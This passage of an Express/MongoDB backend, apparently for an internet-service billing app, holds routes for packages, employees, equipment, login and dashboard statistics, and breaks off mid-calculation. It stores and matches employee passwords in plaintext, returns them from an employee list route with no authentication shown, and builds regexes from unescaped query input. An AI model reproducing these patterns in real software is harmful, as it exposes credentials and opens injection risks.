      return res.status(400).json({
        success: false,
        message: 'Name, speed, and price are required'
      });
    }

    const result = await packagesCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: { name: name.trim(), speed: speed.trim(), price: parseFloat(price) } }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Package not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Package updated successfully'
    });
  } catch (error) {
    console.error('Error updating package:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating package',
      error: error.message
    });
  }
});

// DELETE route to delete a package
app.delete('/api/packages/:id', async (req, res) => {
  try {
    const result = await packagesCollection.deleteOne({ _id: new ObjectId(req.params.id) });
    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Package not found'
      });
    }
    res.status(200).json({
      success: true,
      message: 'Package deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting package:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting package',
      error: error.message
    });
  }
});

// ============ EMPLOYEES API ROUTES ============

// POST route to add an employee
app.post('/api/employees/add', async (req, res) => {
  try {
    const { name, number, role, salary, username, password, isActive, assignedCustomers } = req.body;

    if (!name || !number || !role || salary === undefined || !username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Name, number, role, salary, username, and password are required'
      });
    }

    const employee = {
      name: name.trim(),
      number: number.trim(),
      role: role.trim(),
      salary: parseFloat(salary),
      username: username.trim(),
      password: password.trim(),
      isActive: isActive !== undefined ? isActive : true,
      assignedCustomers: assignedCustomers && Array.isArray(assignedCustomers) ? assignedCustomers : [],
      createdAt: new Date()
    };

    const result = await employeesCollection.insertOne(employee);
    const employeeId = result.insertedId;

    // Update assigned customers in users collection
    if (assignedCustomers && Array.isArray(assignedCustomers) && assignedCustomers.length > 0) {
      const employeeName = name.trim();
      const roleLower = role.trim().toLowerCase();

      // Update customers based on employee role
      if (roleLower === 'fee collector') {
        // Set feeCollector field for assigned customers
        await usersCollection.updateMany(
          { _id: { $in: assignedCustomers.map(id => new ObjectId(id)) } },
          { $set: { feeCollector: employeeName } }
        );
        console.log(`✅ Assigned ${assignedCustomers.length} customers to fee collector: ${employeeName}`);
      } else if (roleLower === 'technician') {
        // Set assignTo field for assigned customers
        await usersCollection.updateMany(
          { _id: { $in: assignedCustomers.map(id => new ObjectId(id)) } },
          { $set: { assignTo: employeeName } }
        );
        console.log(`✅ Assigned ${assignedCustomers.length} customers to technician: ${employeeName}`);
      }
    }

    res.status(201).json({
      success: true,
      message: 'Employee added successfully',
      data: {
        _id: employeeId,
        ...employee
      }
    });
  } catch (error) {
    console.error('Error adding employee:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding employee',
      error: error.message
    });
  }
});

// GET route to fetch all employees
app.get('/api/employees', async (req, res) => {
  try {
    const employees = await employeesCollection.find().sort({ createdAt: -1 }).toArray();
    res.status(200).json({
      success: true,
      count: employees.length,
      data: employees
    });
  } catch (error) {
    console.error('Error fetching employees:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching employees',
      error: error.message
    });
  }
});

// PUT route to update an employee
app.put('/api/employees/:id', async (req, res) => {
  try {
    const { name, number, role, salary, username, password, isActive, assignedCustomers } = req.body;

    if (!name || !number || !role || salary === undefined || !username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Name, number, role, salary, username, and password are required'
      });
    }

    // Get existing employee to check previous assignments
    const existingEmployee = await employeesCollection.findOne({ _id: new ObjectId(req.params.id) });
    if (!existingEmployee) {
      return res.status(404).json({
        success: false,
        message: 'Employee not found'
      });
    }

    const employeeName = name.trim();
    const roleLower = role.trim().toLowerCase();
    const previousAssignedCustomers = existingEmployee.assignedCustomers || [];
    const newAssignedCustomers = assignedCustomers && Array.isArray(assignedCustomers) ? assignedCustomers : [];

    // Update employee document
    const result = await employeesCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      {
        $set: {
          name: employeeName,
          number: number.trim(),
          role: role.trim(),
          salary: parseFloat(salary),
          username: username.trim(),
          password: password.trim(),
          isActive: isActive !== undefined ? isActive : true,
          assignedCustomers: newAssignedCustomers
        }
      }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Employee not found'
      });
    }

    // Remove assignments from customers that were unassigned
    const unassignedCustomers = previousAssignedCustomers.filter(
      id => !newAssignedCustomers.includes(id)
    );

    if (unassignedCustomers.length > 0) {
      const previousRoleLower = (existingEmployee.role || '').toLowerCase();
      if (previousRoleLower === 'fee collector') {
        await usersCollection.updateMany(
          { _id: { $in: unassignedCustomers.map(id => new ObjectId(id)) } },
          { $unset: { feeCollector: '' } }
        );
      } else if (previousRoleLower === 'technician') {
        await usersCollection.updateMany(
          { _id: { $in: unassignedCustomers.map(id => new ObjectId(id)) } },
          { $unset: { assignTo: '' } }
        );
      }
    }

    // Update newly assigned customers
    if (newAssignedCustomers.length > 0) {
      if (roleLower === 'fee collector') {
        // Set feeCollector field for newly assigned customers
        await usersCollection.updateMany(
          { _id: { $in: newAssignedCustomers.map(id => new ObjectId(id)) } },
          { $set: { feeCollector: employeeName } }
        );
        console.log(`✅ Updated ${newAssignedCustomers.length} customers for fee collector: ${employeeName}`);
      } else if (roleLower === 'technician') {
        // Set assignTo field for newly assigned customers
        await usersCollection.updateMany(
          { _id: { $in: newAssignedCustomers.map(id => new ObjectId(id)) } },
          { $set: { assignTo: employeeName } }
        );
        console.log(`✅ Updated ${newAssignedCustomers.length} customers for technician: ${employeeName}`);
      }
    }

    res.status(200).json({
      success: true,
      message: 'Employee updated successfully'
    });
  } catch (error) {
    console.error('Error updating employee:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating employee',
      error: error.message
    });
  }
});

// DELETE route to delete an employee
app.delete('/api/employees/:id', async (req, res) => {
  try {
    const result = await employeesCollection.deleteOne({ _id: new ObjectId(req.params.id) });
    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Employee not found'
      });
    }
    res.status(200).json({
      success: true,
      message: 'Employee deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting employee:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting employee',
      error: error.message
    });
  }
});

// POST route to authenticate employee login
app.post('/api/auth/login', ensureDbConnection, async (req, res) => {
  try {
    const { username, password, role } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username and password are required'
      });
    }

    // Ensure employeesCollection is initialized
    if (!employeesCollection) {
      console.error('❌ Employees collection not initialized');
      return res.status(500).json({
        success: false,
        message: 'Database connection error',
        error: 'Employees collection not initialized'
      });
    }

    // Find employee with matching username and password
    // Only allow active employees to login - strictly check isActive: true
    const employee = await employeesCollection.findOne({
      username: username.trim(),
      password: password.trim(),
      isActive: true // Only active employees can login
    });

    if (!employee) {
      return res.status(401).json({
        success: false,
        message: 'Invalid username or password'
      });
    }

    // Optional: Validate role if provided
    if (role && employee.role && employee.role.toLowerCase() !== role.toLowerCase()) {
      return res.status(401).json({
        success: false,
        message: 'Invalid role for this user'
      });
    }

    // Return success with employee data (excluding password)
    const { password: _, ...employeeData } = employee;
    res.status(200).json({
      success: true,
      message: 'Login successful',
      data: employeeData
    });

  } catch (error) {
    console.error('❌ Error during login:', error);
    console.error('Error stack:', error.stack);
    console.error('Database connection status:', {
      isConnected,
      hasDb: !!db,
      hasEmployeesCollection: !!employeesCollection
    });

    res.status(500).json({
      success: false,
      message: 'Error during login',
      error: error.message
    });
  }
});

// ============ EQUIPMENT (SWITCH & SPLITTER) API ROUTES ============

// POST route to add equipment
app.post('/api/equipment/add', async (req, res) => {
  try {
    const { name, type, streetId, streetName, location, ports, usedPorts } = req.body;

    if (!name || !type || !streetId || !streetName || !location || ports === undefined || usedPorts === undefined) {
      return res.status(400).json({
        success: false,
        message: 'All fields are required'
      });
    }

    const equipment = {
      name: name.trim(),
      type: type,
      streetId: streetId,
      streetName: streetName.trim(),
      location: location.trim(),
      ports: parseInt(ports),
      usedPorts: parseInt(usedPorts),
      createdAt: new Date()
    };

    const result = await equipmentCollection.insertOne(equipment);

    res.status(201).json({
      success: true,
      message: 'Equipment added successfully',
      data: {
        _id: result.insertedId,
        ...equipment
      }
    });
  } catch (error) {
    console.error('Error adding equipment:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding equipment',
      error: error.message
    });
  }
});

// GET route to fetch all equipment
app.get('/api/equipment', async (req, res) => {
  try {
    // Support query params for suggestions
    // q: text search on name (case-insensitive)
    // streetId: filter by streetId if provided
    // type: optional filter (e.g., "Switch", "Splitter")
    const { q, streetId, type } = req.query;

    const query = {};
    if (q) {
      query.name = { $regex: String(q), $options: 'i' };
    }
    if (streetId) {
      query.streetId = String(streetId);
    }
    if (type) {
      query.type = String(type);
    }

    const cursor = equipmentCollection
      .find(query)
      .sort({ createdAt: -1 });

    // For suggestions, it's often useful to cap results
    if (q) {
      cursor.limit(20);
    }

    const equipment = await cursor.toArray();
    res.status(200).json({
      success: true,
      count: equipment.length,
      data: equipment
    });
  } catch (error) {
    console.error('Error fetching equipment:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching equipment',
      error: error.message
    });
  }
});

// PUT route to update equipment
app.put('/api/equipment/:id', async (req, res) => {
  try {
    const { name, type, streetId, streetName, location, ports, usedPorts } = req.body;

    if (!name || !type || !streetId || !streetName || !location || ports === undefined || usedPorts === undefined) {
      return res.status(400).json({
        success: false,
        message: 'All fields are required'
      });
    }

    const result = await equipmentCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      {
        $set: {
          name: name.trim(),
          type: type,
          streetId: streetId,
          streetName: streetName.trim(),
          location: location.trim(),
          ports: parseInt(ports),
          usedPorts: parseInt(usedPorts)
        }
      }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Equipment not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Equipment updated successfully'
    });
  } catch (error) {
    console.error('Error updating equipment:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating equipment',
      error: error.message
    });
  }
});

// DELETE route to delete equipment
app.delete('/api/equipment/:id', async (req, res) => {
  try {
    const result = await equipmentCollection.deleteOne({ _id: new ObjectId(req.params.id) });
    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Equipment not found'
      });
    }
    res.status(200).json({
      success: true,
      message: 'Equipment deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting equipment:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting equipment',
      error: error.message
    });
  }
});

// ============ DASHBOARD API ROUTES ============

// GET dashboard stats
app.get('/api/dashboard/stats', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    const transactionsCollection = db.collection('transactions');
    const vouchersCol = db.collection('vouchers');

    // Get filter parameters
    const feeCollector = req.query.feeCollector;
    const assignTo = req.query.assignTo;

    // Build base user query filter
    let userFilter = {};
    if (feeCollector) {
      const feeCollectorTrimmed = feeCollector.trim();
      userFilter.feeCollector = { $regex: new RegExp(`^${feeCollectorTrimmed}$`, 'i') };
      console.log(`🔍 Filtering dashboard stats by feeCollector (case-insensitive): ${feeCollectorTrimmed}`);
    }
    if (assignTo) {
      const assignToTrimmed = assignTo.trim();
      userFilter.assignTo = { $regex: new RegExp(`^${assignToTrimmed}$`, 'i') };
      console.log(`🔍 Filtering dashboard stats by assignTo (case-insensitive): ${assignToTrimmed}`);
    }

    // 🔍 Pre-fetch user IDs with unpaid/partial months for accurate counting
    const [vouchersWithUnpaidMonths, vouchersWithPartialMonths] = await Promise.all([
      vouchersCol.find({ 'months.status': 'unpaid' }).project({ userId: 1 }).toArray(),
      vouchersCol.find({ 'months.status': 'partial' }).project({ userId: 1 }).toArray()
    ]);
    const userIdsWithUnpaidMonthsForStats = vouchersWithUnpaidMonths.map(v => v.userId.toString());
    const userIdsWithPartialMonthsForStats = vouchersWithPartialMonths.map(v => v.userId.toString());

    const objectIdsWithUnpaid = userIdsWithUnpaidMonthsForStats.map(id => {
      try { return new ObjectId(id); } catch (e) { return id; }
    });
    const objectIdsWithPartial = userIdsWithPartialMonthsForStats.map(id => {
      try { return new ObjectId(id); } catch (e) { return id; }
    });

    // Get user IDs that match the filter (for voucher filtering)
    // CRITICAL: For fee collector, we should NOT pre-filter by user.feeCollector
    // Instead, check receivedBy in vouchers directly (same as paid-users endpoint)
    // Only pre-filter for technician (assignTo) since that's a user-level field
    let filteredUserIds = null;
    if (assignTo) {
      // For technician, pre-filter by assignTo
      const filteredUsers = await usersCollection.find(userFilter).toArray();
      filteredUserIds = filteredUsers.map(u => u._id.toString());
      console.log(`📊 Found ${filteredUserIds.length} users matching assignTo filter`);

      // If filter is applied but no users match, return all zeros
      if (filteredUserIds.length === 0) {
        console.log(`⚠️ No users found for assignTo filter - returning zero stats`);
        return res.status(200).json({
          success: true,
          data: {
            totalUsers: 0,
            paidUsers: 0,
            totalIncome: 0,
            totalExpense: 0,
            unpaidUsers: 0,
            outstanding: 0,
            balance: 0,
            balanceCustomers: 0,
            expiringSoon: 0,
            deactivatedUsers: 0
          }
        });
      }
    } else if (feeCollector) {
      // For fee collector, don't pre-filter - we'll check receivedBy in vouchers directly
      console.log(`📊 Fee collector filter: Will check receivedBy in all vouchers (not pre-filtering by user.feeCollector)`);
    }

    // Total users (with filter if provided)
    // CRITICAL: Count ALL assigned users (regardless of payment status)
    // This ensures when admin assigns a user to a fee collector:
    //   - Umer gets user assigned → Umer's dashboard shows totalUsers = 1 immediately
    //   - MohdAli's dashboard shows totalUsers = 0 (only counts his assigned users)
    const totalUsers = await usersCollection.countDocuments(userFilter);
    console.log(`📊 Total users (assigned to ${feeCollector || assignTo || 'all'}): ${totalUsers}`);

    // CRITICAL: Month-level counting - count users with AT LEAST ONE paid month
    // IMPORTANT: For paid users, we check receivedBy in vouchers directly (same as paid-users endpoint)
    // For unpaid users, we pre-filter by user.feeCollector FIRST (same as unpaid-users endpoint)
    // Only pre-filter for technician (assignTo) since that's a user-level field
    let vouchersForStats = await vouchersCol.find({}).toArray();
    if (assignTo && filteredUserIds && filteredUserIds.length > 0) {
      // For technician, pre-filter by assignTo
      vouchersForStats = vouchersForStats.filter(v =>
        v.userId && filteredUserIds.includes(v.userId.toString())
      );
      console.log(`📊 Filtered vouchers by assignTo: ${vouchersForStats.length} vouchers for ${filteredUserIds.length} users`);
    } else if (feeCollector) {
      // For fee collector paid users, don't pre-filter - check receivedBy in vouchers directly
      console.log(`📊 Fee collector filter: Will check receivedBy in all vouchers for paid users (not pre-filtering by user.feeCollector)`);
    }

    const userIdsWithPaidMonths = new Set();
    const feeCollectorTrimmedForStats = feeCollector ? feeCollector.trim() : null;

    // FALLBACK: Get users assigned to this feeCollector for old payments
    let usersAssignedToFeeCollector = new Set();
    if (feeCollectorTrimmedForStats) {
      const assignedUsers = await usersCollection.find({
        feeCollector: { $regex: new RegExp(`^${feeCollectorTrimmedForStats.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
      }).toArray();
      assignedUsers.forEach(u => usersAssignedToFeeCollector.add(u._id.toString()));
      console.log(`📋 Dashboard Stats - Found ${usersAssignedToFeeCollector.size} users assigned to ${feeCollectorTrimmedForStats}`);
    }

    // Process vouchers for PAID months (check receivedBy for fee collectors)
    vouchersForStats.forEach(voucher => {
      if (Array.isArray(voucher.months)) {
        // Check if voucher has paid months
        // If feeCollector filter is provided, also check receivedBy
        const hasPaidMonth = voucher.months.some(m => {
          const isPaid = m.status === 'paid' || (m.status === 'partial' && Number(m.paidAmount || 0) > 0);
          if (!isPaid) return false;

          // If feeCollector filter is provided, check receivedBy
          if (feeCollectorTrimmedForStats) {
            // CRITICAL: Check THREE conditions (ANY one should be true):
            // 1. User is assigned to this fee collector (user.feeCollector field)
            // 2. Payment was received by this fee collector (receivedBy field)
            // 3. Payment history contains this fee collector

            const userIsAssigned = usersAssignedToFeeCollector.has(voucher.userId.toString());

            // Check month-level receivedBy
            const monthReceivedBy = m.receivedBy || '';
            // Also check paymentHistory for receivedBy
            const paymentHistoryReceivedBy = Array.isArray(m.paymentHistory)
              ? m.paymentHistory.map((p) => p.receivedBy || '').filter(Boolean)
              : [];

            // Match if receivedBy matches feeCollector (case-insensitive)
            const monthMatches = monthReceivedBy &&
              new RegExp(`^${feeCollectorTrimmedForStats.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(monthReceivedBy);
            const historyMatches = paymentHistoryReceivedBy.some((rb) =>
              new RegExp(`^${feeCollectorTrimmedForStats.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(rb)
            );

            // ✅ FIXED: Include user if ANY condition is true
            return userIsAssigned || monthMatches || historyMatches;
          }

          return true; // No feeCollector filter, include all paid months
        });

        if (hasPaidMonth && voucher.userId) {
          userIdsWithPaidMonths.add(voucher.userId.toString());
        }
      }
    });

    console.log(`📊 Dashboard Stats - Found ${userIdsWithPaidMonths.size} users with paid months${feeCollectorTrimmedForStats ? ` (filtered by receivedBy: ${feeCollectorTrimmedForStats})` : ''}`);

    // Count paid users (users with at least one paid month) - exclude inactive
    // CRITICAL: Only count users who actually paid to THIS fee collector (based on receivedBy)
    const paidUserIds = Array.from(userIdsWithPaidMonths).map(id => {
      try {
        return new ObjectId(id);
      } catch (e) {
        return id;
      }
    });

    // Build paid users query with filter
    // CRITICAL: Matches /api/users/paid logic - include 'unpaid' status if they have paid months
    let paidUsersQuery = {
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        },
        {
          status: { $in: ['paid', 'partial', 'unpaid', 'superbalance'] }
        }
      ]
    };

    // Use userIds calculated from vouchers (receivedBy filter already applied)
    // Count all users with status='paid' or 'partial', regardless of expiry date
    let paidUsers = 0;
    if (paidUserIds.length > 0) {
      paidUsersQuery._id = { $in: paidUserIds };
      console.log(`🔒 Dashboard Stats - Using userIds from vouchers (receivedBy filter): ${paidUserIds.length} users`);

      if (assignTo) {
        paidUsersQuery.assignTo = { $regex: new RegExp(`^${assignTo.trim()}$`, 'i') };
      }

      // Exclude users expiring TODAY or TOMORROW (expiring soon users)
      paidUsersQuery.$and.push({
        $or: [
          { showInExpiringSoon: { $ne: true } },
          { showInExpiringSoon: { $exists: false } }
        ]
      });

      // Count all paid users (excluding expiring soon)
      // This ensures dashboard stats match paid-users page
      paidUsers = await usersCollection.countDocuments(paidUsersQuery);
      console.log(`✅ Paid users count: ${paidUsers} (from ${paidUserIds.length} userIds with paid status, excluding expiring soon)`);
    } else {
      // CRITICAL: If no userIds found (no payments to this fee collector), return 0
      // Don't query all users, as that would count users paid to OTHER fee collectors
      console.log(`📊 No paid users found for ${feeCollector || assignTo || 'this filter'}`);
      paidUsers = 0;
    }

    console.log(`📊 FINAL - Paid users for ${feeCollector || assignTo || 'all'}: ${paidUsers}`);

    // Count unpaid users (users with at least one unpaid month) - exclude inactive
    // CRITICAL: For fee collector, use EXACT same logic as /api/users/unpaid endpoint
    // Pre-filter users by user.feeCollector FIRST, then check their vouchers for unpaid months
    let unpaidUsersFilteredByIds = null;
    if (feeCollector) {
      const feeCollectorTrimmed = feeCollector.trim();
      const matchingUsers = await usersCollection.find({
        feeCollector: { $regex: new RegExp(`^${feeCollectorTrimmed}$`, 'i') }
      }).project({ _id: 1 }).toArray();
      unpaidUsersFilteredByIds = new Set(matchingUsers.map(u => u._id.toString()));
      console.log(`📊 Pre-filtered users by user.feeCollector for unpaid users: ${unpaidUsersFilteredByIds.size} users`);
    }

    // Filter vouchers by these pre-filtered user IDs
    let vouchersForUnpaidStats = await vouchersCol.find({}).toArray();
    if (unpaidUsersFilteredByIds && unpaidUsersFilteredByIds.size > 0) {
      vouchersForUnpaidStats = vouchersForUnpaidStats.filter(v =>
        v.userId && unpaidUsersFilteredByIds.has(v.userId.toString())
      );
      console.log(`📊 Pre-filtered vouchers by user.feeCollector for unpaid users: ${vouchersForUnpaidStats.length} vouchers for ${unpaidUsersFilteredByIds.size} users`);
    } else if (feeCollector) {
      // If feeCollector is present but no matching users, then no unpaid users
      console.log(`⚠️ No users found matching feeCollector for unpaid stats - returning zero`);
      const unpaidUsers = 0;
    } else if (assignTo && filteredUserIds && filteredUserIds.length > 0) {
      // For technician, use pre-filtered vouchers
      vouchersForUnpaidStats = vouchersForUnpaidStats.filter(v =>
        v.userId && filteredUserIds.includes(v.userId.toString())
      );
      console.log(`📊 Pre-filtered vouchers by assignTo for unpaid users: ${vouchersForUnpaidStats.length} vouchers`);
    }

    // Now check vouchers for unpaid AND partial months
    // CRITICAL: Count users with EITHER unpaid OR partial months (or both)
    // IMPORTANT: Only include users whose expiry date has passed (after 12 PM on expiry date)
    // This matches what user wants: unpaid + partial = total unpaid count in dashboard
    const userIdsWithUnpaidMonths = new Set();
    const userIdsWithPartialMonths = new Set();

    // Helper function to check if expiry date has passed
    const hasExpiryPassed = (expiryDate) => {
      if (!expiryDate) return true; // No expiry date, include it

      try {
        const now = new Date();
        let expiry;

        if (expiryDate instanceof Date) {
          expiry = new Date(expiryDate);
        } else if (typeof expiryDate === 'string') {
          // Try different formats
          if (/^\d{4}-\d{2}-\d{2}/.test(expiryDate)) {
            expiry = new Date(expiryDate);
          } else {
            const parts = expiryDate.split(/[-\/]/);
            if (parts.length >= 3) {
              const [a, b, c] = parts;
              if (a.length === 4) {
                expiry = new Date(a, parseInt(b) - 1, parseInt(c));
              } else {
                expiry = new Date(c, parseInt(b) - 1, parseInt(a));
              }
            }
          }
        }

        if (!expiry || isNaN(expiry.getTime())) return true;

        // Set to 12 PM on expiry date
        expiry.setHours(12, 0, 0, 0);
        return expiry <= now;
      } catch (error) {
        return true; // Error, include it
      }
    };

    vouchersForUnpaidStats.forEach(voucher => {
      if (Array.isArray(voucher.months)) {
        // CRITICAL: Only process if expiry date has passed
        if (!hasExpiryPassed(voucher.expiryDate)) {
          return; // Skip this voucher - not expired yet
        }

        // Check for unpaid months
        const hasUnpaidMonth = voucher.months.some(m =>
          m.status === 'unpaid'
        );

        // Check for partial months (with remaining amount > 0)
        const hasPartialMonth = voucher.months.some(m =>
          m.status === 'partial' && (m.remainingAmount || 0) > 0
        );

        if (voucher.userId) {
          const userIdStr = voucher.userId.toString();
          if (hasUnpaidMonth) {
            userIdsWithUnpaidMonths.add(userIdStr);
          }
          if (hasPartialMonth) {
            userIdsWithPartialMonths.add(userIdStr);
          }
        }
      }
    });

    // Combine both sets: users with unpaid OR partial months
    const allUnpaidAndPartialUserIds = new Set([...userIdsWithUnpaidMonths, ...userIdsWithPartialMonths]);

    console.log(`📊 Unpaid users calculation (unpaid + partial, after expiry date filter):`);
    console.log(`   - Users with unpaid months: ${userIdsWithUnpaidMonths.size}`);
    console.log(`   - Users with partial months: ${userIdsWithPartialMonths.size}`);
    console.log(`   - Total (unpaid + partial): ${allUnpaidAndPartialUserIds.size}`);
    console.log(`   - Note: Excludes users whose expiry date hasn't been reached (before 12 PM on expiry date)`);

    const unpaidUserIdsArray = Array.from(allUnpaidAndPartialUserIds);

    // CRITICAL: For fee collector, ensure unpaidUserIds only includes users that match feeCollector
    let finalUnpaidUserIds = unpaidUserIdsArray;
    if (feeCollector && unpaidUsersFilteredByIds && unpaidUsersFilteredByIds.size > 0) {
      finalUnpaidUserIds = unpaidUserIdsArray.filter(id =>
        unpaidUsersFilteredByIds.has(id.toString())
      );
      console.log(`🔒 Filtered unpaidUserIds by feeCollector: ${unpaidUserIdsArray.length} → ${finalUnpaidUserIds.length}`);
    }

    const unpaidUserIds = finalUnpaidUserIds.map(id => {
      try {
        return new ObjectId(id);
      } catch (e) {
        return id;
      }
    });

    // Build unpaid users query with filter
    // CRITICAL: Count users with status='unpaid' OR users with status='partial' who still have 'unpaid' months
    // This matches the updated /api/users/unpaid list logic
    let unpaidUsersQuery = {
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        },
        {
          $or: [
            { status: 'unpaid' },
            {
              $and: [
                { status: 'partial' },
                { _id: { $in: objectIdsWithUnpaid } }
              ]
            }
          ]
        }
      ]
    };

    // Apply fee collector filter if provided
    if (feeCollector) {
      unpaidUsersQuery.feeCollector = { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') };
    }

    // Apply technician filter if provided
    if (assignTo) {
      unpaidUsersQuery.assignTo = { $regex: new RegExp(`^${assignTo.trim()}$`, 'i') };
    }

    // Exclude users expiring TODAY or TOMORROW (expiring soon users)
    unpaidUsersQuery.$and.push({
      $or: [
        { showInExpiringSoon: { $ne: true } },
        { showInExpiringSoon: { $exists: false } }
      ]
    });

    // Count only unpaid users (excluding partial/balance users)
    // Example scenarios:
    //   - Pay Later user created 1 Dec with expiry 1 Jan → unpaidUsers = 1 ✓
    //   - User expired yesterday → unpaidUsers = 1 ✓
    //   - User expiring tomorrow → unpaidUsers = 0 (in expiring soon) ✓
    //   - Balance user (partial payment) → unpaidUsers = 0 (in Balance tab) ✓
    const unpaidUsers = await usersCollection.countDocuments(unpaidUsersQuery);

    console.log(`📊 Dashboard Stats - Unpaid users calculation:`);
    console.log(`   - totalUsers: ${totalUsers}, paidUsers: ${paidUsers}, unpaidUsers: ${unpaidUsers}`);
    console.log(`   - Unpaid users include status='unpaid' AND status='partial' with unpaid months (Dual Visibility)`);
    console.log(`   - Excludes expiring soon users (showInExpiringSoon=true)`);


    // Expiring soon (TOMORROW) - include ALL users expiring tomorrow
    // CRITICAL: This is a REMINDER list, not a payment status list
    // Show all users (paid, unpaid, partial, pending, superbalance) expiring tomorrow
    // Stats counts are filtered by expiry date separately above
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const tomorrow = new Date(today);
    tomorrow.setDate(tomorrow.getDate() + 1);
    const endOfTomorrow = new Date(tomorrow);
    endOfTomorrow.setHours(23, 59, 59, 999);

    // Build expiring soon query with filter
    let expiringSoonQuery = {
      status: { $in: ['paid', 'partial', 'unpaid', 'pending', 'superbalance'] },
      expiryDate: {
        $gte: tomorrow.toISOString(),
        $lte: endOfTomorrow.toISOString()
      },
      $or: [
        { serviceStatus: { $ne: 'inactive' } },
        { serviceStatus: { $exists: false } }
      ]
    };
    if (feeCollector) {
      expiringSoonQuery.feeCollector = { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') };
    }
    if (assignTo) {
      expiringSoonQuery.assignTo = { $regex: new RegExp(`^${assignTo.trim()}$`, 'i') };
    }

    const expiringSoon = await usersCollection.countDocuments(expiringSoonQuery);

    // Active users - users with serviceStatus = 'active' or not set (default active)
    let activeUsersQuery = {
      $or: [
        { serviceStatus: 'active' },
        { serviceStatus: { $exists: false } },
        { serviceStatus: null }
      ]
    };
    if (assignTo) {
      activeUsersQuery.assignTo = { $regex: new RegExp(`^${assignTo.trim()}$`, 'i') };
    }
    if (feeCollector) {
      activeUsersQuery.feeCollector = { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') };
    }
    const activeUsers = await usersCollection.countDocuments(activeUsersQuery);

    // Deactivated/Inactive users - users with serviceStatus = 'inactive'
    let deactivatedQuery = {
      serviceStatus: 'inactive'
    };
    if (assignTo) {
      deactivatedQuery.assignTo = { $regex: new RegExp(`^${assignTo.trim()}$`, 'i') };
    }
    if (feeCollector) {
      deactivatedQuery.feeCollector = { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') };
    }
    const deactivatedUsers = await usersCollection.countDocuments(deactivatedQuery);

    console.log(`📊 User counts - Active: ${activeUsers}, Inactive: ${deactivatedUsers}, Total: ${totalUsers}`);

    // Total income - CRITICAL: Check incomes collection first, only recalculate if needed
    // This ensures transfers are not lost on dashboard refresh
    let totalIncome = 0;
    let cashIncome = 0;
    let bankIncome = 0;
    const feeCollectorTrimmed = feeCollector ? feeCollector.trim() : null;

    const incomesCol = db.collection('incomes');
    let shouldRecalculate = false;

    // CRITICAL: Ensure we don't query for "null" or "undefined" as strings
    const isValidCollector = feeCollectorTrimmed &&
      feeCollectorTrimmed.toLowerCase() !== 'null' &&
      feeCollectorTrimmed.toLowerCase() !== 'undefined';

    if (isValidCollector) {
      // Check if fee collector has existing income in database
      const existingIncome = await incomesCol.findOne({
        name: { $regex: new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
      });

      if (existingIncome) {
        // Use existing income from database (don't recalculate)
        // CRITICAL: Even if cashIncome is 0, use it! (could be 0 after transfer)
        cashIncome = existingIncome.cashIncome || 0;
        bankIncome = existingIncome.bankIncome || 0;
        totalIncome = cashIncome + bankIncome;
        console.log(`💰 Using existing income from database for ${feeCollectorTrimmed}: Cash Rs ${cashIncome}, Bank Rs ${bankIncome} (preserving transfers)`);
      } else {
        // No income record found, recalculate from vouchers
        shouldRecalculate = true;
        console.log(`💰 No existing income record found, calculating from vouchers for ${feeCollectorTrimmed}`);
      }
    } else {
      // Admin - check existing income
      const existingAdminIncome = await incomesCol.findOne({
        name: { $regex: new RegExp(`^Admin$`, 'i') }
      });

      if (existingAdminIncome) {
        // Use existing income from database
        // CRITICAL: Even if cashIncome is 0, use it! (could be 0 after expenses/transfers)
        cashIncome = existingAdminIncome.cashIncome || 0;
        bankIncome = existingAdminIncome.bankIncome || 0;
        totalIncome = cashIncome + bankIncome;
        console.log(`💰 Using existing income from database for Admin: Cash Rs ${cashIncome}, Bank Rs ${bankIncome} (preserving transfers/expenses)`);
      } else {
        // No income record found, recalculate from vouchers
        shouldRecalculate = true;
        console.log(`💰 No existing income found, calculating from vouchers for Admin`);
      }
    }

    // RECALCULATE FROM VOUCHERS ONLY IF NEEDED
    if (shouldRecalculate && feeCollectorTrimmed) {
      // Calculate income from vouchers where receivedBy matches feeCollector
      console.log(`💰 Calculating income from vouchers with receivedBy: ${feeCollectorTrimmed}`);

